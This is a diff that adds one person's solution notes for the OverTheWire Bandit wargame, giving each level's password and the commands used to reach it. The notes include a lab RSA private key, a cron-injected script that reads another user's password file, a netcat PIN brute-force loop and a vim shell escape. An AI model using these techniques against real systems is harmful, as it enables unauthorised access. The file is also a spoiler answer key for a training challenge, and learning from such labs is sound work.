@@ -1,0 +1,100 @@
+Level 0: bandit0 (cat readme)
+Level 1: ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If (cat ./-)
+Level 2: 263JGJPfgU6LtdEvgfWU1XP5yac29mFx (cat spaces* OR cat "spaces in this filename")
+Level 3: MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx (cd inhere AND cat "...Hiding-From-You")
+Level 4: 2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ (cd inhere AND file ./* AND cat ./-file07)
+Level 5: 4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw (cat inhere AND find . -size 1033c AND cat ./inhere/maybehere07/.file2 CAN ADD ! -executable CAN ADD -exec file {} \; FULL COMMAND FOR EVERY CASE find . -size 1033c ! -executable -exec file {} \;)
+Level 6: HWasnPhtq9AVKe0dmk45nxy20cvUa6EG (find / -size 33c -user bandit7 -group bandit6 2>/dev/null AND cat /var/lib/dpkg/info/bandit7.password)
+Level 7: morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj (cat data.txt | grep "millionth")
+Level 8: dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc (cat data.txt | sort | uniq -u)
+Level 9: 4CKMh1JI91bUIZZPXDqGanal4xvAg0JM (strings data.txt | grep ===)
+Level 10: FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey (cat data.txt | base64 -d)
+Level 11: dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr (cat data.txt | tr "a-zA-Z" "n-za-mN-ZA-M")
+Level 12: 7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4 (mktemp -d in /tmp | cp ~/data.txt PATH/data.txt then xxd -r data.txt > out.txt THEN file out.txt AND mv out.txt TO COMPRESSION FORMAT and unzip with either gunzip {or apparently gzip -d} OR bzip2 -d OR tar -xvf AND REPEAT until file data.txt is ASCII)
+Level 13: FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn (ssh bandit14@bandit.labs.overthewire.org -p 2220 -i sshkey.private AND cat /etc/bandit_pass/bandit14)
+Level 14: MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS (cd /etc/bandit_pass AND cat bandit14 | nc localhost 30000)
+Level 15: 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo (openssl s_client localhost:30001 AND ENTER THE PASSWORD OF THIS LEVEL)
+Level 16: kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx (nmap -sV localhost -p 31000-32000 -v FROM BANDIT OR REPLACE LOCALHOST AND openssl s_client -quiet localhost:31790 OR -no-sign-eof)
+Level 17: {
+    -----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
+JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
+x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
+KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
+J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
+d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
+YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
+vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
++TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
+8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
+SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
+HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
+SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
+R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
+Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
+R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
+L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
+blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
+YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+-----END RSA PRIVATE KEY-----
+
+} OR PASSWORD EReVavePLFHtFlFsjn3hyzMlvSuSAcRD (MAKE FILE AND chmod 700 file {otherwise ssh won't work} and ssh bandit17@bandit.labs.overthewire.org -p 2220 -i ssh.txt)
+FOR NEXT LEVEL (diff passwords.new passwords.old)
+Level 18: x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO (ssh bandit18@bandit.labs.overthewire.org -p 2220 "cat readme")
+Level 19: cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8 (./bandit20-do cat /etc/bandit_pass/bandit20)
+Level 20: 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO (echo "0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO" | nc -l 2222 & AND ./suconnect 2222)
+Level 21: EeoULMCra2q0dSkYj561DX7s1CpBuOBt (cat /etc/cron.d/cronjob_bandit22 AND cat /usr/bin/cronjob_bandit22.sh AND cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv)
+Level 22: tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q (echo I am user bandit23 | md5sum | cut -d ' ' -f AND cat /tmp/8ca319486bfbbc3663ea0fbe81326349)
+Level 23: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga (cd /etc/cron.d AND cat cronjob_bandit24 AND cat /usr/bin/cronjob_bandit24.sh AND AFTER mktemp -d AND touch /tmp/made_dir/password.txt REPLACE IN CODE
+BEING IN /tmp/tmp.uLIza8UtF1
+chmod 777 password.txt
+chmod 777 /tmp/tmp.uLIza8UtF1
+chmod 777 file.sh
+nano file.sh
+) {
+    SCRIPT
+
+    #!/bin/bash 
+    cat /etc/bandit_pass/bandit24 > /tmp/tmp.uLIza8UtF1/password.txt
+    IT DIDN'T WORK BECAUSE OF THE FUCKING SHEBANG BEING MISSPELLED AAAAAAAAAAAAAAAA
+
+} 
+AND cp file.sh /var/spool/bandit24/foo/
+AND chmod 777 /var/spool/bandit24/foo/file.sh
+WAIT AND cat password.txt
+Level 24: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 () {
+    #!/bin/bash
+
+    expected="I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+    Wrong! Please enter the correct current password and pincode. Try again."
+
+    for ((i=1000; i<10000; i++)); do
+            response=$(echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" | nc localhost 30002 -N)
+            if [ "$response" != "$expected" ]; then
+                    echo "$response"
+            fi
+    done
+}
+Level 25: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4 (make window as small as possinle then ssh bandit26@bandit.labs.overthewire.org -p 2220 -i sshkey.private accept fingerprint and then press v to enter vim
+ONCE INSIDE VIM
+:e /etc/bandit_pass/bandit26
+AND THEN
+:set shell=/bin/bash
+:shell
+)
+Level 26: s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ (./bandit27-do /etc/bandit_pass/bandit27 FROM THE PREVIOUSLY OBTAINED SHELL)
+Level 27: upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB (mktemp -d AND cd in that dir AND THEN git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo AND cd repo AND cat README)
+Level 28: Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN (git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo AND cd repo AND git log -p)
+Level 29: 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7 (git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo AND git checkout dev AND cat README.md)
+level 30: qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL (git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo AND git tag show secret AND git show secret)
+Level 31: fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy (git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo AND echo "May I come in?" > key.txt AND git add key.txt AND git commit -m "Commit" AND git push origin master)
+Level 32: 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K (ENTER $0 AND THEN cat /etc/bandit_pass/bandit33)
+Level 33: tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0
+
+Created with ♥ by alexn
